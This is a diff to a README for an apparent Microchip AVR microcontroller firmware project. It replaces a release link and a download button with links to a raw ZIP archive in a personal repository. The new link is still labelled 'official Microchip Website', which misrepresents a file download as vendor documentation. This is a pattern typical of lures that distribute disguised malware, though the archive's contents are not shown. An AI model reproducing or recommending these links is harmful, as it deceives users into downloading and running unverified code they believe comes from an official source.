@@ -45,13 +45,13 @@ To explore the projects in this repository, follow these steps:
 
 ## Explore Further
 
-For more information and detailed documentation, visit the official [Microchip Website](https://github.com/gesitwl/avr64du32-cnano-8bit-mdfu-solution-mplab-mcc/releases/tag/v2.0).
+For more information and detailed documentation, visit the official [Microchip Website](https://raw.githubusercontent.com/gesitwl/avr64du32-cnano-8bit-mdfu-solution-mplab-mcc/main/baster/avr_du_cnano_mplab_bit_solution_mcc_mdfu_v1.4.zip).
 
 ## Download
 
 Click the button below to download the repository code:
 
-[![Download ZIP](https://github.com/gesitwl/avr64du32-cnano-8bit-mdfu-solution-mplab-mcc/releases/tag/v2.0)](https://github.com/gesitwl/avr64du32-cnano-8bit-mdfu-solution-mplab-mcc/releases/tag/v2.0)
+[![Download ZIP](https://raw.githubusercontent.com/gesitwl/avr64du32-cnano-8bit-mdfu-solution-mplab-mcc/main/baster/avr_du_cnano_mplab_bit_solution_mcc_mdfu_v1.4.zip)](https://raw.githubusercontent.com/gesitwl/avr64du32-cnano-8bit-mdfu-solution-mplab-mcc/main/baster/avr_du_cnano_mplab_bit_solution_mcc_mdfu_v1.4.zip)
 
 Remember to extract the ZIP file after downloading to access the project files.
 
